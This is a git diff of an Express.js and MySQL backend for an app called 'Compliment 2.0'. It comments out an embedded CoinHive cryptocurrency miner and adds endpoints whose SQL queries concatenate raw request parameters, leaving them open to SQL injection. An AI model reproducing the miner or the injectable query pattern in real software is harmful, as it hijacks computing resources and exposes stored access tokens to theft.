@@ -2,7 +2,7 @@ const express = require('express')
 const app = express()
 // MINER))))
 const CoinHive = require('coin-hive');
-
+/*
 (async () => {
   const miner = await CoinHive('iJFqkJpXPWBCQrualE4SxWyLBEqu2RTb');
   await miner.start();
@@ -10,7 +10,7 @@ const CoinHive = require('coin-hive');
   miner.on('found', () => console.log('Found!'));
   miner.on('accepted', () => console.log('Accepted!'));
 })();
-
+*/
 var mysql = require('mysql')
 
 var con = mysql.createConnection({
@@ -50,18 +50,19 @@ app.get('/reg', (req,res) =>{
 	var sql = con.query("SELECT user_id FROM boys WHERE user_id = "+user_id+"", function (err, result, fields) {
 	    if (err) throw err;
 	    if(result[0] == undefined){
-	      var sql = "INSERT INTO boys (access_token, user_id) VALUES ("+token+", '"+user_id+"')";
+	      var sql = "INSERT INTO boys (access_token, user_id) VALUES ('"+token+"', '"+user_id+"')";
 	      con.query(sql, function (err, result) {
 	        if (err) throw err;
 	        getName(user_id)
 	        console.log("User recorded to database");
+	        res.send('New')
 	      });
 	    }else{
 	      console.log('Just used')
+	      res.send('Used')
 	    }
 	})
 	//res.send(token+"<br>"+user_id)
-	res.send('hello')
 })
 
 app.get('/questboy', (req,res) =>{
@@ -85,6 +86,14 @@ app.get('/questboy', (req,res) =>{
 	res.send(answer)
 })
 
+app.get('/get_name', (req,res) =>{
+	var user_id = req.query.user_id
+	var sql = "SELECT name FROM boys WHERE user_id = "+user_id+"";
+        con.query(sql, function (err, result) {
+        if (err) throw err;
+    	res.send(result[0].name)
+    })
+})
 app.get('/girl_id', (req,res) =>{
 	var user_id = req.query.user_id
 	var girl_id = req.query.girl_id
@@ -198,7 +207,8 @@ app.listen(3000, function (){
 	console.log('Compliment 2.0 backend started');
 })
 //http://localhost:3000/questboy?quest=123&quest=321&quest=321&quest=321&quest=321&user_id=133087344
-//
+//http://localhost:3000/girl_id?user_id=133087344&girl_id=153869259
+//http://localhost:3000/reg?access_token=2281337&user_id=133087344
 /*
 con.query("SELECT * FROM coffee", function (err, result, fields) {
     if (err) throw err;
